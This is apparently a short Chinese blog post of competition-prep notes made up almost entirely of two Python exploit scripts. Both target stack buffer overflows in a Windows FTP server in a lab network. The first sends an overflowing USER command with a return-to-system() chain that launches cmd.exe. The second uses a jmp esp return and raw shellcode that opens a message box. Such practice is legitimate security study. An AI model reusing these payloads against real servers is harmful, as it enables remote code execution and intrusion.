占位

省赛前windows溢出的准备，用ROP做了一遍，执行文件为cmd.exe

```python
import socket
import pwn
#target: win 2003 x64
host = '192.168.247.16'
port = 21

ahead_msg_length = len('Password required for ')

#system(): 0x77B8A083
padding = 'A' * (252 - ahead_msg_length) + '\x83\xA0\xB8\x77' + 'C' * 8 # junk bytes + return address + retn 8 offset padding bytes

#string for cmd.exe: 0x77B72014
parm_string = '\x14\x20\xB7\x77' #esp's position after execute retn 8

exp = "USER %s" % padding
exp += 'RETN'
exp += parm_string
exp += '\r\n'

socket_fd = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
socket_fd.connect((host, port))
print socket_fd.recv(200)
socket_fd.send(exp)
print socket_fd.recv(200)


```

去年2016级准备国赛时我写的

```python
#coding:utf-8
from socket import *
#被攻击函数的地址为0x402DE0
#该函数局部变量长度100H。该函数会在接收到的字符串的前面加一个长度为5的字符串"500 '接收到的字符串'",并将该字符串存到局部变量,然后调用send将字符串返回给客户端。
#所以想造成溢出需要先将局部变量空间占满，需填充的字符长度为 256-5 = 251 字节
replacement = 'A'*(251)
jump = "\x53\x93\xD2\x77" + "BBBBBBBB"#(0x77D29353 jmp esp)+ (再填充8个字节是因为返回指令为retn 0x8，所以需要将shellcode位置向下挪8个字节)

"""
shellcode:
00B8404E 33 C0                xor         eax,eax  
00B84050 50                   push        eax  
00B84051 68 77 65 64 20       push        ' dew'  #'wed '
00B84056 68 20 66 6C 6F       push        'olf '  #' flo'
00B8405B 68 6F 76 65 72       push        'revo'  #'over
00B84060 8B DC                mov         ebx,esp  
00B84062 50                   push        eax  
00B84063 50                   push        eax  
00B84064 53                   push        ebx  
00B84065 50                   push        eax  
00B84066 BE EA 07 D5 77       mov         esi,77D507EAh  #MessageBoxA(0,"over flowed",0,0)
00B8406B FF D6                call        esi 
"""
shellcode = "\x33\xC0\x50\x68\x77\x65\x64\x20\x68\x20\x66\x6C\x6F\x68\x6F\x76\x65\x72\x8B\xDC\x50\x50\x53\x50\xBE\xEA\x07\xD5\x77\xFF\xD6"
sockfd = socket(AF_INET,SOCK_STREAM)

payload = replacement + jump + shellcode + "\r\n"
sockfd.connect(("192.168.10.50",21))
sockfd.recv(1024)

sockfd.send('USER anonymous\r\n')
print(sockfd.recv(1024))

sockfd.send('PASS anonymous\r\n')
print(sockfd.recv(1024))

sockfd.send(payload)
print(sockfd.recv(1024))

```

